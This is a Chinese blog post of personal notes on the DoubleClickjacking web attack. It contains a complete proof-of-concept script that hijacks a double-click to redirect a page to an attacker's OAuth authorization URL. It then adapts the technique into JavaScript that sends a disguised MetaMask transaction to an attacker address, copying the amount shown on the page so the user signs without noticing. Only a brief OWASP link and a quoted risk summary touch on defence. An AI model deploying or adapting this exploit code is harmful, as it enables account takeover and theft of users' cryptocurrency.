---
layout:     post                       
title:      DoubleClickjacking笔记&dapp迷思         
subtitle:   
date:       2025-01-05               
author:     Closure                         
header-img: img/ 
catalog: true                         
tags:                                
    - 随记
---
﻿DoubleClickjacking是单击攻击的衍生变种，通过诱导用户双击页面按钮来触发的恶意操作的攻击方式，原理是攻击方通过设计网页来使用户在双击时实际触发的是隐藏了的恶意动作。这种攻击可以用来绕过用户的正常交互然后执行恶意的脚本，扩展一下即可在用户未察觉的情况下进行资金转移。单击攻击的实现简单粗暴，因为它是通过重定向或执行隐藏的表单提交等方式；DoubleClickjacking 则依赖于用户双击的时间窗口&时序控制。

---

### DoubleClickjacking Poc

```
<script>
function openDoubleWindow(url, top, left, width, height) {
    var evilWindow = window.open(window.location.protocol+"//"+
  		window.location.hostname+":"+
  		window.location.port+"/random", 
  	"_blank");

    evilWindow.onload = function() {
        evilWindow.document.open();

        //plugs the page to be hijacked as opener returnee
        evilWindow.document.write(`
            <script>
            setTimeout(function() { 
                opener.location = "${url}"; 
            }, 1000);

            </scri`+`pt>
            
            <div id="doubleclick" type="button" class="button" 
                style="top: ${top}px; left: ${left}px; width: ${width}px; height: ${height}px; position: absolute; font-size: 16px; color: white; background-color: #3498db; box-shadow: 5px 5px 10px rgba(0, 0, 0, 0.3); display: flex; justify-content: center; align-items: center; font-weight: bold; text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3); cursor: pointer; border-radius: 20px; text-align: center; padding: 0 5px; transition: all 0.3s ease;" onmouseover="this.style.backgroundColor='#2980b9'; this.style.boxShadow='6px 6px 12px rgba(0, 0, 0, 0.4)'; this.style.transform='scale(1.05)';" 
                onmouseout="this.style.backgroundColor='#3498db'; this.style.boxShadow='5px 5px 10px rgba(0, 0, 0, 0.3)'; this.style.transform='scale(1)';">Double Click Here</div>
<script>
      document.getElementById('doubleclick').addEventListener('mousedown', function() {
       window.close();
       });
       </scr`+`ipt>`);
        
        evilWindow.document.close();
    };
}
</script>

<!-- Replace value's below with the URL and top, left, width, height of a button you want to doublejack with -->

<button onclick="openDoubleWindow('https://target.com/oauth2/authorize?client_id=attacker',647, 588.5, 260, 43)">Start Demo</button>
```

**window.open** - 打开一个新的窗口或标签页，在这里的恶意窗口 *evilWindow* 会加载预设好的页面 *window.location.protocol* + "//" + *window.location.hostname + ":" + window.location.port + "/random"。*

**evilWindow.onload** -加载完成后脚本开始注入，打开恶意页面的*evilWindow.document.open*，然后通过 *document.write* 将攻击代码注入到该页面。

在代码中设置了一个 1 秒的定时器，*setTimeout* 会让页面在 1 秒后通过 *opener.location *来更改父窗口的位置，实际上却是将父窗口重定向到攻击者指定的 URL ("${url}”)；双击按钮的外观被设计成一个普通的按钮，但它被定位为隐藏在用户无法察觉的位置，所以当用户点击该按钮时实际上是触发了一个 *mousedown* 事件，*window.close()* 被调用来关闭恶意窗口。

**攻击链总结**：通过Demo按钮诱使点击 **——** *openDoubleWindow* 函数被调用，*evilWindow* 被打开后指向一个伪造的页面。**——** 恶意脚本被注入到新打开的窗口，脚本包括了一个 *setTimeout*（将在 1 秒后通过 *opener.location* 操控父窗口的 URL完成恶意的重定向。) **——**  *evilWindo* 页面中注入了双击按钮，该按钮的位置和大小被隐藏在页面的某个区域，所以用户察觉不到真实位置。**——** 用户执行双击时，实际上触发了一个 *mousedown* 事件，这个事件会关闭恶意窗口并通过 *window.close()* 结束对恶意窗口的操作。**——** 触发重定向 **——** 利用用户的授权信息进行敏感操作

---

### 基于 DoubleClickjacking 的Dapp钱包自动签名

在平常用去中心化应用通过浏览器插件（比如MetaMask？）来与链上进行交互和签署交易。在正常情况下，向区块链提交一笔交易时会弹出一个签名请求窗口，来提示确认转账的细节，据上述如果利用 DoubleClickjacking来伪造用户操作，是完全可以导致恶意的交易请求被自动发起，然后通过钱包进行签名来直接转账进攻击者的钱包。

根据上述的代码扩展，需要按照MetaMask的UI构造一个伪装成正常按钮的恶意元素，然后隐藏在页面里面，再调整样式使它与网页中正常的确认转账对齐。

在按钮触发后通过js脚本即刻发起一个交易请求与MetaMask钱包进行交互，然后向钱包发送一个资金转移请求。MetaMask 在接收到交易请求时会弹出一个交易签名界面。攻击方伪造一个与之前正常交易相似的请求，例如将接收方地址和金额设置为与用户的预期相符，还有伪造时间戳和伪造Gas费用等手法。

```
function initiateMaliciousTransaction() {
    const web3 = new Web3(window.ethereum);  
    const maliciousAddress = '114514'; 
    const tx = {
        to: maliciousAddress,
        value: web3.utils.toWei('0.114514', 'ether'), 
        gas: 2000000,
        gasPrice: web3.utils.toWei('20', 'gwei')
    };
    ethereum.request({
        method: 'eth_sendTransaction',
        params: [tx]
    }).then((result) => {
        console.log('Transaction successful:', result);
    }).catch((error) => {
        console.error('Transaction failed:', error);
    });
}
```

↑再结合预期金额伪装一下，大部分DApp进行交易时，金额会显示在页面上，再通过DOM操作or用js来提取页面上显示的金额，只要用户不小心确认了钱包签名请求，那么资金就会直接被转走。

```
// 获取页面上显示的金额
const expectedAmount = document.getElementById('transfer-amount').textContent;
const tx = {
    to: maliciousAddress,
    value: expectedAmount, 
    gas: 2000000,
    gasPrice: web3.utils.toWei('20', 'gwei')
};
```

```
const tx = {
    to: maliciousAddress,
    value: web3.utils.toWei('0.114514', 'ether'),
    gas: 2000000,
    gasPrice: web3.utils.toWei('20', 'gwei'),
    nonce: web3.utils.toHex(Date.now()),  // 使用当前时间戳作为nonce
};
```

攻击方在这两个响应之间插入几毫秒的延迟，就可以确保请求能够在用户点击时就被自动发起，这样的话不管用户双击速度再怎么快，都可以通过这种方式绕过用户对双击的自然反应，让转账交易请求在用户完全意识到之前就已提交到链上。

[Clickjacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html#insecure-non-working-scripts-do-not-use)
OWASP的防护措施，虽然但是目前大多数网络应用程序和框架假设只有一次强制单击是风险（

---

> **Why It’s Dangerous**

> * **Bypass of Clickjacking Protections** **: Most webapps and frameworks assume that only a single forced click is a risk. DoubleClickjacking adds a layer many defenses were never designed to handle. methods like X-Frame-Options, SameSite cookies, or CSP cannot defend against this attack.**

> * **Not Just Websites:** ****This technique can be used to attack not only websites but browser extensions as well. For example, I have made proof of concepts to top browser crypto wallets that uses this technique to authorize web3 transactions & dApps or disabling VPN to expose IP etc. This can also be done in mobile phones by asking target to "DoubleTap".

> * **New Attack Surface** **: This creates new attack opportunities for web attacks. A double-click on an attacker’s website can now lead to serious consequences in multiple platforms.**

> * **Extremely Rampant:** **Based on my tests, all websites by default (those that didn't fix this yet) are vulnerable to this many surprising impacts including oauth takeovers etc. I've reported this issue to some sites, the results have been mixed. Most have chosen to address it  while some have chosen not to.**

> * **Minimal User Interaction** : It only requires the target to double-click. They don’t need to fill out forms or perform crazy multiple steps (if the site can open windows or launched from site that can).

> P.S: Note that windows can be opened on top of the whole browser (instead of as a tab), hiding the fact that the opener has changed location (and all tabs)

---



> ### 为什么它很危险

> **绕过点击劫持保护：** 大多数网页应用和框架假设只有单次强制点击是风险点，而>**DoubleClickjacking**（双击劫持）增加了一个层级，许多防御措施并未设计来应对这种攻击。像 `X-Frame-Options`、`SameSite` cookies 或者 `CSP` 等方法无法防御这种攻击。

> **不仅仅是网站：** 这种技术不仅可以用来攻击网站，还可以攻击浏览器插件。例如，我已经制作了一些概念验证，展示了如何利用这种技术通过加密钱包插件授权 Web3 交易与 DApp，或者禁用 VPN 来暴露 IP 等等。这种攻击也可以在手机上进行，要求目标用户进行“双击”。

> **新的攻击面：** 这种攻击为网页攻击提供了新的机会。在攻击者网站上进行双击，现在可能会在多个平台上引发严重后果。

> **极其普遍：** 根据我的测试，所有未修复此漏洞的网站（即那些尚未解决此问题的网站）都容易受到这种攻击，带来了包括 OAuth 劫持等意外影响。我已经向一些网站报告了这个问题，结果不尽相同。大多数选择修复它，而一些则选择忽视它。

> **最小化用户交互：** 它只需要目标用户进行双击，而不需要填写表单或执行复杂的多步骤操作（如果网站允许打开窗口或者从网站发起操作的话）。

> **附言：** 请注意，窗口可以在整个浏览器上方打开（而不是作为标签页），这隐藏了“窗口打开者”位置的变化（以及所有标签页）。




